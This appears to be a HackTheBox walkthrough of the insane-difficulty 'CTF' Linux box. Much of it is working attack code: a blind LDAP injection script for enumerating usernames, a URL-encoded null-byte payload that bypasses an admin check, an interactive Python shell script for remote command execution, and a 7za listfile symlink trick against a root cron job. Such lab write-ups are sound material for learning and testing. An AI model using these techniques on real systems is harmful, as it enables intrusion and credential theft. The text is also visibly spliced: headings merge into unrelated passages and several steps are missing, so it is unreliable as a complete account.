12:T7bd3,<p>CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The application is vulnerable to LDAP injection but due to character blacklisting the payloads need to be double URL encoded. After enumeration, a token string is found, which is obtained using boolean injection. Using the token an OTP can be generated, which allows for execution of commands. After establishing a foothold, a cron can be exploited to gain sensitive information.</p><figure><img src="/writing/media/674ede1de92a4f3eb7afbbf3.webp" alt="HackTheBox “CTF” Walkthrough, figure 1" width="300" height="300" loading="lazy" decoding="async" /></figure><p>Difficulty: Insane | OS: Linux (CentOS 7) | IP: 10.129.228.35</p><h2 id="1-mindset-and-methodology-overview">1. Mindset &amp; Methodology Overview</h2><p>Before touching the machine, the hacker mindset frames every action around one question: “What does this system trust, and can I abuse that trust?”</p><p>For CTF, the answer turned out to be: it trusts user-supplied input into an LDAP query without sanitising encoded characters, and it trusts filenames passed to 7-Zip without validating listfile references.</p><p>The overall methodology follows:</p><p>Recon → Enumerate → Find Injection Point → Exploit → Escalate</p><p>Every step is driven by evidence, not guessing. If a tool returns an interesting response, ask why — the “why” is usually the vulnerability.</p><p>— -</p><h2 id="2-phase-1-reconnaissance">2. Phase 1 — Reconnaissance</h2><p>Goal:<br />Understand the attack surface. You cannot exploit what you don’t know exists.</p><h3 id="step-1-full-tcp-port-scan">Step 1: Full TCP Port Scan</h3><p>nmap -sC -sV -p 22,80 10.129.228.35</p><p>Why: -sC runs default scripts (banner grabbing, http-title etc), -sV fingerprints service versions, -oN saves output for reference. We target 22 and 80 specifically after a fast full-range scan confirms only these two are open.</p><p>Output:</p><p>22/tcp open ssh OpenSSH 7.4 (protocol 2.0)<br />80/tcp open http Apache httpd 2.4.6 (CentOS) OpenSSL/1.0.2k PHP/5.4.16</p><p>Hacker Mindset<br />- Port 22 (SSH): Noted for later. Requires credentials — come back when we have them.<br />- Port 80 (HTTP): Primary attack surface. PHP 5.4 is old and has known quirks (e.g. null byte handling in strings).<br />- CentOS 7 + Apache 2.4.6: Helps narrow OS-specific attack paths and confirms SELinux is likely enforced.</p><figure><img src="/writing/media/e11b7f6dbe79c774e5e2c4a6.webp" alt="HackTheBox “CTF” Walkthrough, figure 2" width="1200" height="575" loading="lazy" decoding="async" /></figure><p>— -</p><h2 id="3-phase-2-web-enumeration">3. Phase 2 — Web Enumeration</h2><p>Goal:<br />Map the application’s functionality and find hints about the backend technology.</p><h3 id="step-2-browse-to-the-site">Step 2: Browse to the Site</h3><p>Navigate to <a href="http://10.129.228.35/" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35/</a>. The landing page warns explicitly:</p><p>“Do not try to brute force”</p><p>Hacker Mindset: This is a signal, not just a warning. It tells you the developer anticipated automated tooling and added protections. Brute-force banning means any technique we use must be precise and targeted, not noisy.</p><figure><img src="/writing/media/2f8f246e30b436c1b28a492f.webp" alt="HackTheBox “CTF” Walkthrough, figure 3" width="1200" height="934" loading="lazy" decoding="async" /></figure><h3 id="step-3-view-page-source-on-login-php">Step 3: View Page Source on /login.php</h3><p>curl -s <a href="http://10.129.228.35/login.php" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35/login.php</a> | grep -i ‘&lt;! — ‘</p><p>Output (critical HTML comments):</p><p>&lt;! — we’ll change the schema in the next phase of the project (if and only if we will pass the VA/PT) →<br />&lt;! — at the moment we have choosen an already existing attribute in order to store the token string (81 digits) →</p><p>Why this matters: These comments are developer notes accidentally left in production. They reveal:<br />1. The backend is LDAP (directory schema is mentioned)<br />2. An existing LDAP attribute stores an 81-digit token string<br />3. The token is used for OTP authentication</p><p>Hacker Mindset: Developer comments are gold. They describe design decisions the developer thought were private. “81 digits stored in an existing attribute” immediately suggests the OTP seed is readable via LDAP injection if the input isn’t sanitised.</p><figure><img src="/writing/media/3cb8d833f77f3a686af59851.webp" alt="HackTheBox “CTF” Walkthrough, figure 4" width="1200" height="751" loading="lazy" decoding="async" /></figure><h3 id="step-4-identify-the-input-filter">Step 4: Identify the Input Filter</h3><p>Try submitting special LDAP characters directly into the username field:</p><p>* ( ) | &amp; ! =</p><p>All of them silently fail — the form reloads with no error. But submitting their URL-encoded equivalents (e.g. %2a for *) returns “Cannot login”.</p><p>Why this matters: The server-side filter checks for raw special characters but not URL-encoded versions. After the filter check, PHP calls urldecode() on the value before using it in the LDAP query. This is the classic input validation bypass via encoding.</p><p>The server’s PHP logic is effectively:</p><p>if (!preg_match(‘/[()*&amp;|!=&gt;&lt;~]/’, $username1)) { // filter on raw input<br /> $username2 = urldecode($username1); // then decode<br /> // use $username2 in LDAP query — INJECTION POINT<br />}</p><figure><img src="/writing/media/8407469fdc6759c2d5476c9a.webp" alt="HackTheBox “CTF” Walkthrough, figure 5" width="1200" height="591" loading="lazy" decoding="async" /></figure><p>— -</p><h2 id="4-phase-3-ldap-injection-username-enumeration">4. Phase 3 — LDAP Injection: Username Enumeration</h2><p>Background: How LDAP Injection Works</p><p>LDAP queries use a filter syntax like:</p><p>(&amp;(objectClass=inetOrgPerson)(uid=INPUT))</p><p>If INPUT is user-controlled and unsanitised, an attacker can close existing parentheses and add new conditions — exactly like SQL injection but with LDAP syntax.</p><p>Key LDAP operators:<br />- * : Wildcard<br />- () : Group<br />- &amp; : AND<br />- | : OR<br />- ! : NOT</p><h3 id="step-5-confirm-ldap-wildcard-works">Step 5: Confirm LDAP Wildcard Works</h3><p>import requests, urllib.parse</p><p>resp = requests.post(“<a href="http://10.129.228.35/login.php" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35/login.php</a>",<br /> data={“inputUsername”: “%2a”, “inputOTP”: “0000”})<br />print(“Cannot login” in resp.text) # True = wildcard matched a user</p><p>Why %2a: The * character is filtered raw, but %2a (URL-encoded *) passes the filter and gets decoded by urldecode() before reaching the LDAP query. The LDAP server then receives * and matches any user.</p><p>Response: “Cannot login” — confirms at least one user exists.</p><h3 id="step-6-enumerate-the-username-character-by-character">Step 6: Enumerate the Username Character by Character</h3><p>import requests, urllib.parse</p><p>username = “”<br />chars = “abcdefghijklmnopqrstuvwxyz0123456789”</p><p>while True:<br />for c in chars:<br />test = f”{username}{c}*”<br />data = {“inputUsername”: urllib.parse.quote(test), “inputOTP”: “0000”}<br />resp = requests.post(“<a href="http://10.129.228.35/login.php" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35/login.php</a>", data=data)<br />if “Cannot login” in resp.text:<br />username += c<br />print(f”\r[*] Found so far: {username}”, end=””, flush=True)<br />break<br />else:<br />break</p><p>print(f”\n[+] Username: {username}”)</p><p>Why this works (Blind LDAP Injection):<br />- We submit a* → LDAP checks if any user starts with a → “not found” = no, “Cannot login” = yes<br />- We repeat for each character position until no more characters match<br />- This is blind injection — we learn information based on behavioural differences, not direct data output</p><p>Result:</p><p>[+] Username: ldapuser</p><figure><img src="/writing/media/51efd2febe2354e0120a44ee.webp" alt="HackTheBox “CTF” Walkthrough, figure 6" width="1200" height="924" loading="lazy" decoding="async" /></figure><p>— -</p><h2 id="5-phase-4-ldap-injection-extracting-the-otp-seed">5. The tool stoken implements this algorithm on Linux.</p><h3 id="step-9-install-stoken">Step 9: Install stoken</h3><p>sudo apt install stoken -y</p><h3 id="step-10-generate-otp-correctly">Step 10: Generate OTP Correctly</h3><p>The token is marked “expired” in stoken’s metadata, so — force is needed. Crucially, the server’s clock must be used as the time reference, and calendar.timegm() must convert the UTC Date header correctly (not time.mktime() which applies local timezone offset):</p><p>import requests, time, calendar<br />from subprocess import Popen, PIPE</p><p>seed = “[redacted retired-lab OTP seed]”</p><p>r = requests.get(“<a href="http://10.129.228.35/login.php" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35/login.php</a>")<br />server_utc = time.strptime(r.headers[‘Date’], “%a, %d %b %Y %H:%M:%S %Z”)<br />server_time = calendar.timegm(server_utc) # UTC-aware conversion</p><p>p = Popen([‘stoken’, f’ — token={seed}’, f’ — use-time={server_time}’,<br /> ‘ — pin=0000’, ‘ — force’], stdout=PIPE)<br />otp = p.communicate()[0].decode().strip()<br />print(f”OTP: {otp}”)</p><p>Why calendar.timegm not time.mktime:<br />- time.mktime() treats input as local time → if Kali is in UTC+X, timestamp is off by hours → wrong OTP every time<br />- calendar.timegm() treats input as UTC → correct absolute Unix timestamp → correct OTP</p><p>Why — use-time with absolute timestamp:<br />- — use-time takes a Unix epoch value, not a delta<br />- Using the server’s actual current time ensures our OTP matches what the server calculates</p><pre><code data-language="text">┌──(kali㉿kali)-[~/Downloads]└─$ cat &lt;&lt; Phase 6 — Second-Order LDAP Injection (Admin Bypass)</h2><p>Background: What is Second-Order Injection?</p><p>In second-order injection, malicious input is stored during one operation and executed in a different operation. Here:<br />1. Login (first operation): The injected username is stored in the PHP session<br />2. page.php (second operation): The stored username is retrieved from session and used in a different LDAP query — one that checks group membership</p><p>The Two LDAP Queries</p><p>Login query (just authenticates):</p><p>(&amp;(&amp;(objectClass=inetOrgPerson)(uid=INPUT))(pager=*))</p><p>Admin check query on page.php (checks group):</p><p>(&amp;(&amp;(objectClass=inetOrgPerson)(uid=INPUT)(|(gidNumber=4)(gidNumber=0)))(pager=*))</p><p>gidNumber=0 is root, gidNumber=4 is adm. ldapuser has gidNumber=1000 — so this check always fails for normal users.</p><h3 id="step-11-inject-null-byte-to-truncate-the-admin-query">Step 11: Inject Null Byte to Truncate the Admin Query</h3><p>Payload: ldapuser%29%29%29%00<br />Decoded: ldapuser))) + null byte (\x00)</p><p>When stored in session and used in the admin check query:</p><p>(&amp;(&amp;(objectClass=inetOrgPerson)(uid=ldapuser)))\x00)(|(gidNumber=4)(gidNumber=0)))(pager=*))</p><p>PHP/LDAP truncates the string at the null byte, leaving:</p><p>(&amp;(&amp;(objectClass=inetOrgPerson)(uid=ldapuser)))</p><p>The gidNumber check is completely removed from the query. The LDAP server returns ldapuser as a valid result, and page.php grants command execution.</p><p>Why three closing parens ))):<br />- ) closes (uid=ldapuser<br />- ) closes (&amp;(objectClass=…)(uid=ldapuser)<br />- ) closes the outer (&amp;…)</p><p>This produces a syntactically valid LDAP filter that matches ldapuser, bypassing the group restriction.</p><h3 id="step-12-build-the-shell-script">Step 12: Build the Shell Script</h3><p>#!/usr/bin/env python3<br />import re, requests, time, calendar<br />from cmd import Cmd<br />from subprocess import Popen, PIPE</p><p>class CTF_TERM(Cmd):<br /> prompt = “CTF&gt; “</p><p>def __init__(self):<br /> super().__init__()<br /> self.seed = ‘[redacted retired-lab OTP seed]’<br /> self.s = requests.session()<br /> self.target = ‘<a href="http://10.129.228.35'/" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.35’</a><br /> otp = self.get_otp()<br /> resp = self.s.post(f’{self.target}/login.php’,<br /> data={“inputUsername”: “ldapuser%29%29%29%00”, “inputOTP”: otp})<br /> print(“[+] Logged in!” if “Logout” in resp.text else “[-] Login failed”)</p><p>def get_otp(self):<br /> r = self.s.get(f’{self.target}/login.php’)<br /> t = calendar.timegm(time.strptime(r.headers[‘Date’], “%a, %d %b %Y %H:%M:%S %Z”))<br /> p = Popen([‘stoken’, f’ — token={self.seed}’, f’ — use-time={t}’,<br /> ‘ — pin=0000’, ‘ — force’], stdout=PIPE)<br /> return p.communicate()[0].decode().strip()</p><p>def default(self, cmd):<br /> resp = self.s.post(f’{self.target}/page.php’,<br /> data={“inputCmd”: cmd, “inputOTP”: self.get_otp()})<br /> result = re.findall(r’&lt;pre&gt;(.*?)&lt;/pre&gt;’, resp.text, re.DOTALL)<br /> print(result[0].rstrip() if result else “[-] No output”)</p><p>term = CTF_TERM()<br />try:<br /> term.cmdloop()<br />except KeyboardInterrupt:<br /> print()</p><p>Why a Python cmd.Cmd shell?<br />Each command on page.php requires a fresh OTP. The cmd.Cmd class gives us an interactive REPL that automatically calls get_otp() (which re-fetches server time) for every command, eliminating timing issues.</p><figure><img src="/writing/media/ca6fe69dd968b9646e2b9f20.webp" alt="HackTheBox “CTF” Walkthrough, figure 10" width="1200" height="1056" loading="lazy" decoding="async" /></figure><p>— -</p><h2 id="8-phase-7-remote-code-execution-via-page-php">8. Phase 7 — Remote Code Execution via page.php</h2><h3 id="step-13-verify-rce">Step 13: Verify RCE</h3><p>CTF&gt; id<br />uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0</p><p>We have code execution as the apache user. SELinux context httpd_t means:<br />- We cannot write to /tmp (SELinux blocks fifo_file creation there)<br />- We cannot get a reverse shell via mkfifo /tmp/f — SELinux blocks it<br />- We can read files apache has read access to</p><p>Hacker Mindset: SELinux prevents the obvious reverse shell. Rather than fighting it, use the web interface itself as the command channel — which is exactly what our Python shell does. Work within constraints intelligently.</p><p>— -</p><h2 id="9-phase-8-credential-extraction-and-ssh-shell">9. Phase 8 — Credential Extraction &amp; SSH Shell</h2><h3 id="step-14-read-login-php-for-hardcoded-credentials">Step 14: Read login.php for Hardcoded Credentials</h3><p>CTF&gt; cat /var/www/html/login.php</p><p>Key section of output:</p><p>$username = ‘ldapuser’;<br />$password = ‘[redacted retired-lab credential]’;</p><p>Why credentials are here: The PHP code needs to bind to the LDAP server to run queries. That bind requires credentials. Developers frequently hardcode service account credentials in PHP source — a common finding in real-world web app assessments.</p><p>Hacker Mindset: Always read every PHP file you can access after getting RCE. Config files, includes, and connection files routinely contain credentials, API keys, or database passwords.</p><figure><img src="/writing/media/cfa369c97cff3f8294eefb9e.webp" alt="HackTheBox “CTF” Walkthrough, figure 11" width="1200" height="999" loading="lazy" decoding="async" /></figure><h3 id="step-15-ssh-as-ldapuser">Step 15: SSH as ldapuser</h3><p>ssh ldapuser@10.129.228.35<br /># Password: [redacted retired-lab credential]</p><h3 id="step-16-grab-user-txt">Step 16: Grab user.txt</h3><p>cat ~/user.txt<br /># b53676[redacted]71c2777a709</p><p>Why SSH over web shell: SSH gives a proper TTY, persistent session, tab completion, and no SELinux httpd_t restrictions. If a filename starts with @, 7za treats it as a listfile — a text file whose contents are a list of additional filenames to archive.</p><p>So if we create a file named @list, 7za will open the file named list and try to archive every filename written inside it.</p><p>If list is a symlink to /root/root.txt, 7za opens /root/root.txt (as root) and reads its contents as a list of filenames to archive. The flag value (e.g. [redacted retired-lab CTF flag]) is not a valid filename, so 7za emits a warning — and that warning gets logged to error.log via the cron job’s stderr redirection.</p><p>Why — doesn’t protect against this:<br />The — flag in 7za stops switch parsing (so -r can’t be injected as a switch). But @listfile references are not switches — they are part of the filename/argument processing that happens after — . The developer protected against wildcard switch injection but missed the listfile vector.</p><h3 id="step-18-set-up-the-trap">Step 18: Set Up the Trap</h3><p>First, confirm the uploads directory is writable (it was already 777, accessible to ldapuser):</p><p>ls -la /var/www/html/uploads/<br /># drwxrwxrwx. 2 apache apache</p><p>Create the trap files:</p><p>cd /var/www/html/uploads</p><p># The @ prefix tells 7za “treat the following filename as a listfile”<br />touch @list</p><p># The listfile ‘list’ points to root’s flag<br />ln -s /root/root.txt list</p><p>ls -la<br /># -rw-rw-r — . 1 ldapuser ldapuser 0 @list<br /># lrwxrwxrwx. 1 ldapuser ldapuser 14 list -&gt; /root/root.txt</p><p>Why an empty @list?<br />The @list file just needs to exist so the shell glob * expands to include it. Root’s flag is leaked as a side-effect of that error.</p><p>— -</p><h2 id="11-lessons-learned-and-key-techniques">11. Lessons Learned &amp; Key Techniques</h2><p>Vulnerability Summary<br />1. Blind LDAP Injection (Username Enum) — login.php — Username disclosure<br />2. Blind LDAP Injection (Attribute Exfil) — login.php — OTP seed disclosure<br />3. Second-Order LDAP Injection + Null Byte — login.php → page.php — Admin group bypass → RCE<br />4. Hardcoded Credentials — login.php — SSH access as ldapuser<br />5. 7za @listfile via Wildcard Expansion — honeypot.sh (cron) — Root flag disclosure</p><h2 id="key-lessons">Key Lessons</h2><p>1. Always re-enumerate dynamically<br />The token seed from every public writeup was wrong. The machine had been reset. Trusting static writeup values cost significant time. Always extract live data — especially secrets.</p><p>2. Encoding is a filter bypass technique, not just formatting<br />The server filtered *()&amp; raw but not URL-encoded. Understanding that urldecode() runs after the filter is the key insight. In real engagements, test both raw and encoded forms of injection payloads.</p><p>3. Second-order injection is about context switching<br />The injection bypassed the login check but still failed on page.php — because page.php ran a different LDAP query against the same stored username. Recognise that stored user-controlled data can be re-injected in a different context.</p><p>4. Null bytes still work in PHP 5.4 LDAP<br />Modern PHP (7+) sanitises null bytes in many contexts. PHP 5.4 does not. Version fingerprinting during recon directly informs which techniques are viable.</p><p>5. Developer comments are security findings<br />The HTML comment revealing “81-digit token in existing attribute” told us exactly what to look for in the LDAP injection. In real assessments, document every comment, error message, and debug artifact.</p><p>6. Know your tools deeply<br />stoken — use-time takes an absolute Unix timestamp. time.mktime() is timezone-aware. calendar.timegm() is not. A 5-hour timezone offset silently broke OTP generation. Reading manpages and understanding edge cases separates a stuck assessment from a completed one.</p><p>7. SELinux changes how you exploit, not whether you can<br />Standard reverse shells were blocked by SELinux’s httpd_t context. Instead of fighting SELinux directly, we used the web application as the command channel — which is always permitted because it’s what httpd_t is designed to allow.</p><p>8. The — only blocks switch injection.
